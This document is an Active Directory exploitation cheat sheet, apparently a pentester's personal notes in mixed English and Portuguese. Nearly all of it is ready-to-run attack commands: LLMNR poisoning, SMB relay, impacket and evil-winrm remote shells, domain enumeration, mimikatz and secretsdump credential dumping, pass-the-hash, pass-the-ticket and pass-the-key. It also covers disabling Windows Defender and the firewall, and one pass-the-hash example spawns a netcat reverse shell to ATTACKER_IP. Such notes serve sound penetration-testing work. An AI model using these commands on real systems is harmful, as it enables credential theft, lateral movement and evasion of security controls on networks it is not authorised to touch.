## AD CheatSheet
My AD exploitation cheatsheet.

### LLMNR Poisoning

1- Responder:

    responder -I eth0 -v

2 - Crack Hash:

    hashcat -m 5600 HASH_FILE WORDLIST --force

**Refs:** https://hashcat.net/wiki/doku.php?id=example_hashes

### SMB Relay
This attack needs smb singing disable or not required (use nmap **smb2-security-mode** nse script) and it requires that both targets have the same user with administrator privileges.

Step 1 - Responder: (Note: Disbale SMB and HTTP on **responder.conf**)

    responder -I eth0 -v

Step 2 - impacket-ntlmrelayx (NTLM Hashes)

    impacket-ntlmrelayx -t RELAY_TARGET_IP -smb2support

Step 3 - impacket-ntlmrelayx (Intercative Shell)

    impacket-ntlmrelayx -t RELAY_TARGET_IP -smb2support -i

### Shell (PsExec, WMIexec, evil-winrm)

WMIExec

    impacket-wmiexec DOMAIN/USER:'PASSWORD'@TARGET_IP -shell-type powershell

PSexec

    impacket-psexec DOMAIN/USER:'PASSWORD'@TARGET_IP 

SMBExec

    impacket-smbexec DOMAIN/USER:"PASSWORD"@TARGET_IP -shell-type powershell

Evil-Winrm

    evil-winrm -i TARGET_IP -u 'USER' -p 'PASSWORD'

### LDAP Enumeration

ldapdomaindump

    ldapdomaindump -u DOMAIN\\\USER -p PASSWORD TARGET_IP

ldapsearch

**Reference_Link**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

    Exemplo: ldapsearch -x -H ldap://192.168.5.129 -D 'MARVEL\frank.castle' -w 'Password1' -b "CN=Domain Admins,OU=Groups,DC=MARVEL,DC=local"

### CMD Enumeration

Listar users do dominio: **net user /domain**

Listar users locais: **net user**

Infos sobre determinado user do dominio: **net user USUARIO /domain**

Info sobre determinado user local: **net user USUARIO**

Listar grupos do dominio: **net group /domain**

Listar grupos locais: **net group**

Listar users de um determinado grupo do dominio: **net group "GRUPO" /domain**

Listar users de um determinado grupo local: **net group "GRUPO"**

Listar Password Policy: **net accounts /domain**

### Powershell Enumeration

Infos sobre determinado user do dominio: **Get-ADUser -Identity USER -Server DOMAIN -Properties** *

Listar users de um determinado grupo do dominio: **Get-ADGroup -Identity GROUP -Server DOMAIN**

Listar users de um determinado grupo do dominio: **Get-ADGroupMember -Identity GROUP -Server DOMAIN**

Infos do domain: **Get-ADDomain -Server DOMAIN**

### PowerView Enumeration

Infos sobre o dominio: **Get-NetDomain**

Infos sobre o DC: **Get-DomainController**

Usuarios do Domain: **Get-DomainUser | select-object samaccountname**

Descricao dos users do Domain: **Get-DomainUser | select-object samaccountname,description**

Grupos do domain: **get-domaingroup | select-object samaccountname**

Usuarios de um grupo: **get-domaingroupmember "GRUPO"** 

Grupos de dominio que um usuario faz parte: **Get-NetGroup -UserName USER | select samaccountname**

Grupos Locais: **Get-NetLocalGroup**

Infos sobre politica de acesso: **(Get-DomainPolicy).SystemAccess**

### BloodHound

1 - Collect method all using session

    Sharphound.exe --CollectionMethods All --Domain Domain --ExcludeDCs

### Dump Credentials (Pass The Hash - PTH)

1 - Secretsdump

    sudo impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET_IP

2 - Crackmapexec

    cme smb TAREGT_IP -u "USER" -p 'PASSWORD' --sam
    cme smb TAREGT_IP -u "USER" -H 'HASH' --sam

3 - Mimikatz - Dump Hash

    privilege::debug
    sekurlsa::LogonPasswords

3 - Mimikatz - Dump Hash (Another Way - Local SAM)

    privilege::debug
    token::elevate
    lsadump::sam

3 - Mimikatz - Dump Hash (Another Way - LSASS memory)

    privilege::debug
    token::elevate
    sekurlsa::msv

**Note** Use `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. 

    EXEMPLO:
    token::revert
    sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"

**Refs**: https://adsecurity.org/?page_id=1821

### Dump Tickets (Pass The Ticket - PTT)

1 - Mimikatz - Export Tickets

    privilege::debug
    sekurlsa::tickets /export

**Note**: Use `klist` to list tickets for current session

1 - Mimikatz - Reuse Kirbi

    privilege::debug
    kerberos::ptt FILE.kirbi
    EXEMPLO: kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi

### Dump Keys (Pass The Key - PTK)

1 - Mimikatz - Dump Keys

    privilege::debug
    sekurlsa::ekeys



### Disable Defender

1 - Check

    sc query WinDefend
    Get-MpComputerStatus | Select AntivirusEnabled
    Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled,IsTamperProtected | FL

**NOTE**:  If Tamper protection is enabled you will not be able to turn off Defender by CMD or PowerShell. You can however, still create an exclusion.

2 - Disable

    Uninstall-WindowsFeature -Name Windows-Defender (AD Only)
    Set-MpPreference -DisableRealtimeMonitoring $true
    netsh advfirewall set allprofiles state off (Firewall)
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False (Firewall)

**Refs**: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender

**Note**: After Disable, restart the machine -> `shutdown -r -t 0 /f`

3 - Exclusion Path

    Add-MpPreference -ExclusionPath "C:\PATH\HERE"

### Powershell CheatSheet

1 - PortScanner

    https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner

### Pivoting 

Secure Socket Funneling (https://securesocketfunneling.github.io/ssf/#home)

1 - Client

    ./ssf -D PORT_1 -p PORT_2 HOST_SSFD

2 - Server

    .\ssfd.exe -p PORT_2

**NOTE**: Change the config file `/etc/proxychains4.conf`